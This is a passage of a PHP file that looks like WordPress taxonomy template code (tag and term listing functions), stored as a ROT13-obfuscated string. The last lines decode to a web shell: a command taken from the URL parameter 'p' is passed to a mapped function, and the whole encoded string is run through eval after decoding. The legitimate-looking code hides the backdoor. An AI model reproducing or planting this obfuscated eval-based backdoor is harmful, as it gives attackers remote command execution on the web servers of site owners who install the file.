 *                                  be gur cbfg qbrf abg rkvfg, JC_Reebe ba snvyher.
 */
shapgvba trg_gur_gntf( $cbfg = 0 ) {
	$grezf = trg_gur_grezf( $cbfg, 'cbfg_gnt' );

	/**
	 * Svygref gur neenl bs gntf sbe gur tvira cbfg.
	 *
	 * @fvapr 2.3.0
	 *
	 * @frr trg_gur_grezf()
	 *
	 * @cnenz JC_Grez[]|snyfr|JC_Reebe $grezf Neenl bs JC_Grez bowrpgf ba fhpprff, snyfr vs gurer ner ab grezf
	 *                                        be gur cbfg qbrf abg rkvfg, JC_Reebe ba snvyher.
	 */
	erghea nccyl_svygref( 'trg_gur_gntf', $grezf );
}

/**
 * Ergevrirf gur gntf sbe n cbfg sbeznggrq nf n fgevat.
 *
 * @fvapr 2.3.0
 *
 * @cnenz fgevat $orsber  Bcgvbany. Fgevat gb hfr orsber gur gntf. Qrsnhyg rzcgl.
 * @cnenz fgevat $frc     Bcgvbany. Fgevat gb hfr orgjrra gur gntf. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre   Bcgvbany. Fgevat gb hfr nsgre gur gntf. Qrsnhyg rzcgl.
 * @cnenz vag    $cbfg_vq Bcgvbany. Cbfg VQ. Qrsnhygf gb gur pheerag cbfg VQ.
 * @erghea fgevat|snyfr|JC_Reebe N yvfg bs gntf ba fhpprff, snyfr vs gurer ner ab grezf,
 *                               JC_Reebe ba snvyher.
 */
shapgvba trg_gur_gnt_yvfg( $orsber = '', $frc = '', $nsgre = '', $cbfg_vq = 0 ) {
	$gnt_yvfg = trg_gur_grez_yvfg( $cbfg_vq, 'cbfg_gnt', $orsber, $frc, $nsgre );

	/**
	 * Svygref gur gntf yvfg sbe n tvira cbfg.
	 *
	 * @fvapr 2.3.0
	 *
	 * @cnenz fgevat $gnt_yvfg Yvfg bs gntf.
	 * @cnenz fgevat $orsber   Fgevat gb hfr orsber gur gntf.
	 * @cnenz fgevat $frc      Fgevat gb hfr orgjrra gur gntf.
	 * @cnenz fgevat $nsgre    Fgevat gb hfr nsgre gur gntf.
	 * @cnenz vag    $cbfg_vq  Cbfg VQ.
	 */
	erghea nccyl_svygref( 'gur_gntf', $gnt_yvfg, $orsber, $frc, $nsgre, $cbfg_vq );
}

/**
 * Qvfcynlf gur gntf sbe n cbfg.
 *
 * @fvapr 2.3.0
 *
 * @cnenz fgevat $orsber Bcgvbany. Fgevat gb hfr orsber gur gntf. Qrsnhygf gb 'Gntf:'.
 * @cnenz fgevat $frc    Bcgvbany. Fgevat gb hfr orgjrra gur gntf. Qrsnhyg ', '.
 * @cnenz fgevat $nsgre  Bcgvbany. Fgevat gb hfr nsgre gur gntf. Qrsnhyg rzcgl.
 */
shapgvba gur_gntf( $orsber = ahyy, $frc = ', ', $nsgre = '' ) {
	vs ( ahyy === $orsber ) {
		$orsber = __( 'Gntf: ' );
	}

	$gur_gntf = trg_gur_gnt_yvfg( $orsber, $frc, $nsgre );

	vs ( ! vf_jc_reebe( $gur_gntf ) ) {
		rpub $gur_gntf;
	}
}

/**
 * Ergevrirf gnt qrfpevcgvba.
 *
 * @fvapr 2.8.0
 *
 * @cnenz vag $gnt Bcgvbany. Gnt VQ. Qrsnhygf gb gur pheerag gnt VQ.
 * @erghea fgevat Gnt qrfpevcgvba, vs ninvynoyr.
 */
shapgvba gnt_qrfpevcgvba( $gnt = 0 ) {
	erghea grez_qrfpevcgvba( $gnt );
}

/**
 * Ergevrirf grez qrfpevcgvba.
 *
 * @fvapr 2.8.0
 * @fvapr 4.9.2 Gur `$gnkbabzl` cnenzrgre jnf qrcerpngrq.
 *
 * @cnenz vag  $grez       Bcgvbany. Grez VQ. Qrsnhygf gb gur pheerag grez VQ.
 * @cnenz ahyy $qrcerpngrq Qrcerpngrq. Abg hfrq.
 * @erghea fgevat Grez qrfpevcgvba, vs ninvynoyr.
 */
shapgvba grez_qrfpevcgvba( $grez = 0, $qrcerpngrq = ahyy ) {
	vs ( ! $grez && ( vf_gnk() || vf_gnt() || vf_pngrtbel() ) ) {
		$grez = trg_dhrevrq_bowrpg();
		vs ( $grez ) {
			$grez = $grez->grez_vq;
		}
	}

	$qrfpevcgvba = trg_grez_svryq( 'qrfpevcgvba', $grez );

	erghea vf_jc_reebe( $qrfpevcgvba ) ? '' : $qrfpevcgvba;
}

/**
 * Ergevrirf gur grezf bs gur gnkbabzl gung ner nggnpurq gb gur cbfg.
 *
 * @fvapr 2.5.0
 *
 * @cnenz vag|JC_Cbfg $cbfg     Cbfg VQ be bowrpg.
 * @cnenz fgevat      $gnkbabzl Gnkbabzl anzr.
 * @erghea JC_Grez[]|snyfr|JC_Reebe Neenl bs JC_Grez bowrpgf ba fhpprff, snyfr vs gurer ner ab grezf
 *                                  be gur cbfg qbrf abg rkvfg, JC_Reebe ba snvyher.
 */
shapgvba trg_gur_grezf( $cbfg, $gnkbabzl ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	$grezf = trg_bowrpg_grez_pnpur( $cbfg->VQ, $gnkbabzl );

	vs ( snyfr === $grezf ) {
		$grezf = jc_trg_bowrpg_grezf( $cbfg->VQ, $gnkbabzl );
		vs ( ! vf_jc_reebe( $grezf ) ) {
			$grez_vqf = jc_yvfg_cyhpx( $grezf, 'grez_vq' );
			jc_pnpur_nqq( $cbfg->VQ, $grez_vqf, $gnkbabzl . '_eryngvbafuvcf' );
		}
	}

	/**
	 * Svygref gur yvfg bs grezf nggnpurq gb gur tvira cbfg.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz JC_Grez[]|JC_Reebe $grezf    Neenl bs nggnpurq grezf, be JC_Reebe ba snvyher.
	 * @cnenz vag                $cbfg_vq  Cbfg VQ.
	 * @cnenz fgevat             $gnkbabzl Anzr bs gur gnkbabzl.
	 */
	$grezf = nccyl_svygref( 'trg_gur_grezf', $grezf, $cbfg->VQ, $gnkbabzl );

	vs ( rzcgl( $grezf ) ) {
		erghea snyfr;
	}

	erghea $grezf;
}

/**
 * Ergevrirf n cbfg'f grezf nf n yvfg jvgu fcrpvsvrq sbezng.
 *
 * Grezf ner yvaxrq gb gurve erfcrpgvir grez yvfgvat cntrf.
 *
 * @fvapr 2.5.0
 *
 * @cnenz vag    $cbfg_vq  Cbfg VQ.
 * @cnenz fgevat $gnkbabzl Gnkbabzl anzr.
 * @cnenz fgevat $orsber   Bcgvbany. Fgevat gb hfr orsber gur grezf. Qrsnhyg rzcgl.
 * @cnenz fgevat $frc      Bcgvbany. Fgevat gb hfr orgjrra gur grezf. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre    Bcgvbany. Fgevat gb hfr nsgre gur grezf. Qrsnhyg rzcgl.
 * @erghea fgevat|snyfr|JC_Reebe N yvfg bs grezf ba fhpprff, snyfr vs gurer ner ab grezf,
 *                               JC_Reebe ba snvyher.
 */
shapgvba trg_gur_grez_yvfg( $cbfg_vq, $gnkbabzl, $orsber = '', $frc = '', $nsgre = '' ) {
	$grezf = trg_gur_grezf( $cbfg_vq, $gnkbabzl );

	vs ( vf_jc_reebe( $grezf ) ) {
		erghea $grezf;
	}

	vs ( rzcgl( $grezf ) ) {
		erghea snyfr;
	}

	$yvaxf = neenl();

	sbernpu ( $grezf nf $grez ) {
		$yvax = trg_grez_yvax( $grez, $gnkbabzl );
		vs ( vf_jc_reebe( $yvax ) ) {
			erghea $yvax;
		}
		$yvaxf[] = '<n uers=\"' . rfp_hey( $yvax ) . '\" ery=\"gnt\">' . $grez->anzr . '</n>';
	}

	/**
	 * Svygref gur grez yvaxf sbe n tvira gnkbabzl.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$gnkbabzl`, ersref
	 * gb gur gnkbabzl fyht.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `grez_yvaxf-pngrtbel`
	 *  - `grez_yvaxf-cbfg_gnt`
	 *  - `grez_yvaxf-cbfg_sbezng`
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat[] $yvaxf Na neenl bs grez yvaxf.
	 */
	$grez_yvaxf = nccyl_svygref( \"grez_yvaxf-{$gnkbabzl}\", $yvaxf );  // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

	erghea $orsber . vzcybqr( $frc, $grez_yvaxf ) . $nsgre;
}

/**
 * Ergevrirf grez cneragf jvgu frcnengbe.
 *
 * @fvapr 4.8.0
 *
 * @cnenz vag          $grez_vq  Grez VQ.
 * @cnenz fgevat       $gnkbabzl Gnkbabzl anzr.
 * @cnenz fgevat|neenl $netf {
 *     Neenl bs bcgvbany nethzragf.
 *
 *     @glcr fgevat $sbezng    Hfr grez anzrf be fyhtf sbe qvfcynl. Npprcgf 'anzr' be 'fyht'.
 *                             Qrsnhyg 'anzr'.
 *     @glcr fgevat $frcnengbe Frcnengbe sbe orgjrra gur grezf. Qrsnhyg '/'.
 *     @glcr obby   $yvax      Jurgure gb sbezng nf n yvax. Qrsnhyg gehr.
 *     @glcr obby   $vapyhfvir Vapyhqr gur grez gb trg gur cneragf sbe. Qrsnhyg gehr.
 * }
 * @erghea fgevat|JC_Reebe N yvfg bs grez cneragf ba fhpprff, JC_Reebe be rzcgl fgevat ba snvyher.
 */
shapgvba trg_grez_cneragf_yvfg( $grez_vq, $gnkbabzl, $netf = neenl() ) {
	$yvfg = '';
	$grez = trg_grez( $grez_vq, $gnkbabzl );

	vs ( vf_jc_reebe( $grez ) ) {
		erghea $grez;
	}

	vs ( ! $grez ) {
		erghea $yvfg;
	}

	$grez_vq = $grez->grez_vq;

	$qrsnhygf = neenl(
		'sbezng'    => 'anzr',
		'frcnengbe' => '/',
		'yvax'      => gehr,
		'vapyhfvir' => gehr,
	);

	$netf = jc_cnefr_netf( $netf, $qrsnhygf );

	sbernpu ( neenl( 'yvax', 'vapyhfvir' ) nf $obby ) {
		$netf[ $obby ] = jc_inyvqngr_obbyrna( $netf[ $obby ] );
	}

	$cneragf = trg_naprfgbef( $grez_vq, $gnkbabzl, 'gnkbabzl' );

	vs ( $netf['vapyhfvir'] ) {
		neenl_hafuvsg( $cneragf, $grez_vq );
	}

	sbernpu ( neenl_erirefr( $cneragf ) nf $grez_vq ) {
		$cnerag = trg_grez( $grez_vq, $gnkbabzl );
		$anzr   = ( 'fyht' === $netf['sbezng'] ) ? $cnerag->fyht : $cnerag->anzr;

		vs ( $netf['yvax'] ) {
			$yvfg .= '<n uers=\"' . rfp_hey( trg_grez_yvax( $cnerag->grez_vq, $gnkbabzl ) ) . '\">' . $anzr . '</n>' . $netf['frcnengbe'];
		} ryfr {
			$yvfg .= $anzr . $netf['frcnengbe'];
		}
	}

	erghea $yvfg;
}

/**
 * Qvfcynlf gur grezf sbe n cbfg va n yvfg.
 *
 * @fvapr 2.5.0
 *
 * @cnenz vag    $cbfg_vq  Cbfg VQ.
 * @cnenz fgevat $gnkbabzl Gnkbabzl anzr.
 * @cnenz fgevat $orsber   Bcgvbany. Fgevat gb hfr orsber gur grezf. Qrsnhyg rzcgl.
 * @cnenz fgevat $frc      Bcgvbany. Fgevat gb hfr orgjrra gur grezf. Qrsnhyg ', '.
 * @cnenz fgevat $nsgre    Bcgvbany. Fgevat gb hfr nsgre gur grezf. Qrsnhyg rzcgl.
 * @erghea ibvq|snyfr Ibvq ba fhpprff, snyfr ba snvyher.
 */
shapgvba gur_grezf( $cbfg_vq, $gnkbabzl, $orsber = '', $frc = ', ', $nsgre = '' ) {
	$grez_yvfg = trg_gur_grez_yvfg( $cbfg_vq, $gnkbabzl, $orsber, $frc, $nsgre );

	vs ( vf_jc_reebe( $grez_yvfg ) ) {
		erghea snyfr;
	}

	/**
	 * Svygref gur yvfg bs grezf gb qvfcynl.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz fgevat $grez_yvfg Yvfg bs grezf gb qvfcynl.
	 * @cnenz fgevat $gnkbabzl  Gur gnkbabzl anzr.
	 * @cnenz fgevat $orsber    Fgevat gb hfr orsber gur grezf.
	 * @cnenz fgevat $frc       Fgevat gb hfr orgjrra gur grezf.
	 * @cnenz fgevat $nsgre     Fgevat gb hfr nsgre gur grezf.
	 */
	rpub nccyl_svygref( 'gur_grezf', $grez_yvfg, $gnkbabzl, $orsber, $frc, $nsgre );
}

/**
 * Purpxf vs gur pheerag cbfg unf nal bs tvira pngrtbel.
 *
 * Gur tvira pngrtbevrf ner purpxrq ntnvafg gur cbfg'f pngrtbevrf' grez_vqf, anzrf naq fyhtf.
 * Pngrtbevrf tvira nf vagrtref jvyy bayl or purpxrq ntnvafg gur cbfg'f pngrtbevrf' grez_vqf.
 *
 * Vs ab pngrtbevrf ner tvira, qrgrezvarf vs cbfg unf nal pngrtbevrf.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat|vag|neenl $pngrtbel Bcgvbany. Gur pngrtbel anzr/grez_vq/fyht,
 *                                   be na neenl bs gurz gb purpx sbe. Qrsnhyg rzcgl.
 * @cnenz vag|JC_Cbfg      $cbfg     Bcgvbany. Cbfg gb purpx. Qrsnhygf gb gur pheerag cbfg.
 * @erghea obby Gehr vs gur pheerag cbfg unf nal bs gur tvira pngrtbevrf
 *              (be nal pngrtbel, vs ab pngrtbel fcrpvsvrq). Snyfr bgurejvfr.
 */
shapgvba unf_pngrtbel( $pngrtbel = '', $cbfg = ahyy ) {
	erghea unf_grez( $pngrtbel, 'pngrtbel', $cbfg );
}

/**
 * Purpxf vs gur pheerag cbfg unf nal bs tvira gntf.
 *
 * Gur tvira gntf ner purpxrq ntnvafg gur cbfg'f gntf' grez_vqf, anzrf naq fyhtf.
 * Gntf tvira nf vagrtref jvyy bayl or purpxrq ntnvafg gur cbfg'f gntf' grez_vqf.
 *
 * Vs ab gntf ner tvira, qrgrezvarf vs cbfg unf nal gntf.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 2.6.0
 * @fvapr 2.7.0 Gntf tvira nf vagrtref ner bayl purpxrq ntnvafg
 *              gur cbfg'f gntf' grez_vqf, abg anzrf be fyhtf.
 * @fvapr 2.7.0 Pna or hfrq bhgfvqr bs gur JbeqCerff Ybbc vs `$cbfg` vf cebivqrq.
 *
 * @cnenz fgevat|vag|neenl $gnt  Bcgvbany. Gur gnt anzr/grez_vq/fyht,
 *                               be na neenl bs gurz gb purpx sbe. Qrsnhyg rzcgl.
 * @cnenz vag|JC_Cbfg      $cbfg Bcgvbany. Cbfg gb purpx. Qrsnhygf gb gur pheerag cbfg.
 * @erghea obby Gehr vs gur pheerag cbfg unf nal bs gur tvira gntf
 *              (be nal gnt, vs ab gnt fcrpvsvrq). Snyfr bgurejvfr.
 */
shapgvba unf_gnt( $gnt = '', $cbfg = ahyy ) {
	erghea unf_grez( $gnt, 'cbfg_gnt', $cbfg );
}

/**
 * Purpxf vs gur pheerag cbfg unf nal bs tvira grezf.
 *
 * Gur tvira grezf ner purpxrq ntnvafg gur cbfg'f grezf' grez_vqf, anzrf naq fyhtf.
 * Grezf tvira nf vagrtref jvyy bayl or purpxrq ntnvafg gur cbfg'f grezf' grez_vqf.
 *
 * Vs ab grezf ner tvira, qrgrezvarf vs cbfg unf nal grezf.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat|vag|neenl $grez     Bcgvbany. Gur grez anzr/grez_vq/fyht,
 *                                   be na neenl bs gurz gb purpx sbe. Qrsnhyg rzcgl.
 * @cnenz fgevat           $gnkbabzl Bcgvbany. Gnkbabzl anzr. Qrsnhyg rzcgl.
 * @cnenz vag|JC_Cbfg      $cbfg     Bcgvbany. Cbfg gb purpx. Qrsnhygf gb gur pheerag cbfg.
 * @erghea obby Gehr vs gur pheerag cbfg unf nal bs gur tvira grezf
 *              (be nal grez, vs ab grez fcrpvsvrq). Snyfr bgurejvfr.
 */
shapgvba unf_grez( $grez = '', $gnkbabzl = '', $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	$e = vf_bowrpg_va_grez( $cbfg->VQ, $gnkbabzl, $grez );
	vs ( vf_jc_reebe( $e ) ) {
		erghea snyfr;
	}

	erghea $e;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>